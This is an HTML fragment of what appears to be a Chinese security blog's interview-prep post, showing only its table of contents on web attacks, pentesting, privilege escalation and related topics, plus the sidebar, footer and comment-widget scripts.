class="toc-text">07.SQL注入攻击有哪些危害？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#08-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%9C%89%E4%BA%86%E8%A7%A3%E5%90%97%EF%BC%9F"><span class="toc-number">2.9.</span> <span class="toc-text">08.文件上传有了解吗？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86"><span class="toc-number">2.9.1.</span> <span class="toc-text">1&gt;原理:()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">2.9.2.</span> <span class="toc-text">2&gt;利用思路:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8D%B1%E5%AE%B3"><span class="toc-number">2.9.3.</span> <span class="toc-text">3&gt;危害:()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%BB%95%E8%BF%87"><span class="toc-number">2.9.4.</span> <span class="toc-text">4&gt;绕过:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E9%98%B2%E8%8C%83"><span class="toc-number">2.9.5.</span> <span class="toc-text">5&gt;防范:()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#09-XSS%E6%94%BB%E5%87%BB%E6%9C%89%E4%BA%86%E8%A7%A3%E5%90%97%EF%BC%9F"><span class="toc-number">2.10.</span> <span class="toc-text">09.XSS攻击有了解吗？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9C%89%E4%BA%86%E8%A7%A3-%E5%8E%9F%E7%90%86"><span class="toc-number">2.10.1.</span> <span class="toc-text">1&gt;有了解,原理:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.10.2.</span> <span class="toc-text">2&gt;类型:()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8D%B1%E5%AE%B3-2"><span class="toc-number">2.10.3.</span> <span class="toc-text">3&gt;危害:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%98%B2%E6%8A%A4"><span class="toc-number">2.10.4.</span> <span class="toc-text">4&gt;防护:()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-CSRF-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><span class="toc-number">2.11.</span> <span class="toc-text">10.CSRF(跨站请求伪造)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86-2"><span class="toc-number">2.11.1.</span> <span class="toc-text">1&gt;原理:()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%B1%BB%E5%9E%8B-2"><span class="toc-number">2.11.2.</span> <span class="toc-text">2&gt;类型:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8D%B1%E5%AE%B3-3"><span class="toc-number">2.11.3.</span> <span class="toc-text">3&gt;危害:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD"><span class="toc-number">2.11.4.</span> <span class="toc-text">4&gt;防范措施</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-SSRF%E6%9C%89%E4%BA%86%E8%A7%A3%E5%90%97"><span class="toc-number">2.12.</span> <span class="toc-text">11.SSRF有了解吗?</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86-3"><span class="toc-number">2.12.1.</span> <span class="toc-text">1&gt;原理:()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-SSRF%E5%88%A9%E7%94%A8%E7%82%B9"><span class="toc-number">2.12.2.</span> <span class="toc-text">2&gt;SSRF利用点()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%BB%95%E8%BF%87"><span class="toc-number">2.12.3.</span> <span class="toc-text">3&gt;绕过:()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%8D%B1%E5%AE%B3"><span class="toc-number">2.12.4.</span> <span class="toc-text">4&gt;危害:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E9%98%B2%E8%8C%83-2"><span class="toc-number">2.12.5.</span> <span class="toc-text">5&gt;防范:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-csrf%E3%80%81ssrf%E4%B8%8Exss%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">2.13.</span> <span class="toc-text">12.csrf、ssrf与xss的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#13-XXE%E5%AE%9E%E4%BD%93%E6%94%BB%E5%87%BB%E6%9C%89%E4%BA%86%E8%A7%A3%E5%90%97%EF%BC%9F"><span class="toc-number">2.14.</span> <span class="toc-text">13.XXE实体攻击有了解吗？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86-4"><span class="toc-number">2.14.1.</span> <span class="toc-text">1&gt;原理:()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-XXE%E6%9E%84%E5%BB%BA"><span class="toc-number">2.14.2.</span> <span class="toc-text">2&gt;XXE构建:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8D%B1%E5%AE%B3-4"><span class="toc-number">2.14.3.</span> <span class="toc-text">3&gt;危害:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%98%B2%E8%8C%83"><span class="toc-number">2.14.4.</span> <span class="toc-text">4&gt;防范:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#14-%E5%B8%B8%E8%A7%81%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F"><span class="toc-number">2.15.</span> <span class="toc-text">14.常见的中间件漏洞有哪些？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#15-%E4%BA%86%E8%A7%A3%E8%BF%87WAF%E5%90%97%EF%BC%9F"><span class="toc-number">2.16.</span> <span class="toc-text">15.了解过WAF吗？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">2.16.1.</span> <span class="toc-text">概念:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E8%A6%81%E5%8A%9F%E8%83%BD"><span class="toc-number">2.16.2.</span> <span class="toc-text">主要功能:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%85%B7%E5%A4%87%E7%9A%84%E5%8A%9F%E8%83%BD"><span class="toc-number">2.16.3.</span> <span class="toc-text">不具备的功能:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#16-%E7%BB%95%E8%BF%87WAF%E7%9A%84%E5%A7%BF%E5%8A%BF%EF%BC%9F"><span class="toc-number">2.17.</span> <span class="toc-text">16.绕过WAF的姿势？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#17-%E4%BD%A0%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%EF%BC%9F"><span class="toc-number">2.18.</span> <span class="toc-text">17.你在渗透测试中常用的工具？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.18.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90"><span class="toc-number">2.18.2.</span> <span class="toc-text">抓包分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-2"><span class="toc-number">2.18.3.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="toc-number">2.18.4.</span> <span class="toc-text">漏洞扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E6%88%96%E7%88%86%E7%A0%B4"><span class="toc-number">2.18.5.</span> <span class="toc-text">目录扫描或爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">2.18.6.</span> <span class="toc-text">暴力破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E6%88%96%E5%88%A9%E7%94%A8"><span class="toc-number">2.18.7.</span> <span class="toc-text">SQL注入漏洞扫描或利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.18.8.</span> <span class="toc-text">XSS漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WebShell%E5%88%A9%E7%94%A8"><span class="toc-number">2.18.9.</span> <span class="toc-text">WebShell利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%8D%E6%9D%80"><span class="toc-number">2.18.10.</span> <span class="toc-text">免杀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%BC%E5%90%88"><span class="toc-number">2.18.11.</span> <span class="toc-text">综合</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#18-%E4%BD%BF%E7%94%A8%E8%BF%87%E5%93%AA%E4%BA%9B%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%EF%BC%9F"><span class="toc-number">2.19.</span> <span class="toc-text">18.使用过哪些安全设备？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#19-%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AB%AF%E5%8F%A3%E5%92%8C%E7%9B%B8%E5%85%B3%E7%9A%84%E6%9C%8D%E5%8A%A1%EF%BC%9F"><span class="toc-number">2.20.</span> <span class="toc-text">19.常见的端口和相关的服务？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#20-%E5%B8%B8%E8%A7%81%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8F%8A%E5%AF%B9%E5%BA%94%E7%AB%AF%E5%8F%A3%EF%BC%9F"><span class="toc-number">2.21.</span> <span class="toc-text">20.常见的数据库及对应端口？()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#21-%E4%B8%BA%E4%BD%95%E4%B8%80%E4%B8%AAmysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E7%AB%99%EF%BC%8C%E5%8F%AA%E6%9C%89%E4%B8%80%E4%B8%AA80%E7%AB%AF%E5%8F%A3%E5%BC%80%E6%94%BE%EF%BC%9F"><span class="toc-number">2.22.</span> <span class="toc-text">21.为何一个mysql数据库的站，只有一个80端口开放？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#22-3389-%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5-%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5%E7%9A%84%E5%87%A0%E7%A7%8D%E6%83%85%E5%86%B5%EF%BC%9F"><span class="toc-number">2.23.</span> <span class="toc-text">22.3389(远程连接)无法连接的几种情况？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#23-%E5%88%A4%E6%96%AD%E5%87%BA%E7%BD%91%E7%AB%99%E7%9A%84CMS%E5%AF%B9%E6%B8%97%E9%80%8F%E6%9C%89%E4%BB%80%E4%B9%88%E6%84%8F%E4%B9%89%EF%BC%9F"><span class="toc-number">2.24.</span> <span class="toc-text">23.判断出网站的CMS对渗透有什么意义？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#24-%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E7%9B%AE%E6%A0%87%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F"><span class="toc-number">2.25.</span> <span class="toc-text">24.如何判断目标操作系统?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#25-%E5%B8%B8%E8%A7%81%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E3%80%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%87%BD%E6%95%B0%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="toc-number">2.26.</span> <span class="toc-text">25.常见代码执行、文件读取、命令执行的函数有哪些?</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">2.26.1.</span> <span class="toc-text">代码执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">2.26.2.</span> <span class="toc-text">文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.26.3.</span> <span class="toc-text">命令执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#26-%E6%9C%A8%E9%A9%AC%E9%A9%BB%E7%95%99%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%96%B9%E5%BC%8F%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F"><span class="toc-number">2.27.</span> <span class="toc-text">26.木马驻留系统的方式有哪些？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#27-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%EF%BC%9F"><span class="toc-number">2.28.</span> <span class="toc-text">27.内网渗透思路？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#28-Windows%E5%B8%B8%E7%94%A8%E7%9A%84%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%EF%BC%9F"><span class="toc-number">2.29.</span> <span class="toc-text">28.Windows常用的提权方法？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#29-Linux%E5%B8%B8%E7%94%A8%E7%9A%84%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%EF%BC%9F"><span class="toc-number">2.30.</span> <span class="toc-text">29.Linux常用的提权方法？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#30-%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E5%92%8C%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">2.31.</span> <span class="toc-text">30.正向代理和反向代理的区别?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#31-%E6%AD%A3%E5%90%91shell%E5%92%8C%E5%8F%8D%E5%90%91shell%E7%9A%84%E5%8C%BA%E5%88%AB%EF%BC%9F"><span class="toc-number">2.32.</span> <span class="toc-text">31.正向shell和反向shell的区别？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#32-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%8C%BA%E5%88%AB%EF%BC%9F"><span class="toc-number">2.33.</span> <span class="toc-text">32.序列化与反序列化的区别？</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">基本思路流程</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/%E9%9D%A2%E8%AF%95/HW%E9%9D%A2%E8%AF%95/" title="HW面试"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HW面试"/></a><div class="content"><a class="title" href="/%E9%9D%A2%E8%AF%95/HW%E9%9D%A2%E8%AF%95/" title="HW面试">HW面试</a><time datetime="2023-04-17T11:20:30.291Z" title="发表于 2023-04-17 19:20:30">2023-04-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E8%93%9D%E9%98%9F/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E8%93%9D%E9%98%9F-windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" title="蓝队"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="蓝队"/></a><div class="content"><a class="title" href="/%E8%93%9D%E9%98%9F/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E8%93%9D%E9%98%9F-windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" title="蓝队">蓝队</a><time datetime="2023-04-10T10:28:42.094Z" title="发表于 2023-04-10 18:28:42">2023-04-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E6%B8%97%E9%80%8F/CS/%E8%BF%9B%E9%98%B6/CS-%E6%B8%97%E9%80%8F/" title="CS-渗透"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CS-渗透"/></a><div class="content"><a class="title" href="/%E6%B8%97%E9%80%8F/CS/%E8%BF%9B%E9%98%B6/CS-%E6%B8%97%E9%80%8F/" title="CS-渗透">CS-渗透</a><time datetime="2023-04-10T10:28:42.093Z" title="发表于 2023-04-10 18:28:42">2023-04-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E6%B8%97%E9%80%8F/CS/%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC/CS%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6%E6%94%BB%E5%87%BB/" title="CS邮件钓鱼攻击"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CS邮件钓鱼攻击"/></a><div class="content"><a class="title" href="/%E6%B8%97%E9%80%8F/CS/%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC/CS%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6%E6%94%BB%E5%87%BB/" title="CS邮件钓鱼攻击">CS邮件钓鱼攻击</a><time datetime="2023-04-10T10:28:42.091Z" title="发表于 2023-04-10 18:28:42">2023-04-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E6%B8%97%E9%80%8F/CS/%E5%91%BD%E4%BB%A4%E7%AF%87/CS-LSTAR/" title="CS-命令篇"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CS-命令篇"/></a><div class="content"><a class="title" href="/%E6%B8%97%E9%80%8F/CS/%E5%91%BD%E4%BB%A4%E7%AF%87/CS-LSTAR/" title="CS-命令篇">CS-命令篇</a><time datetime="2023-04-10T10:28:42.090Z" title="发表于 2023-04-10 18:28:42">2023-04-10</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Jinmu</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '',
      appKey: '',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>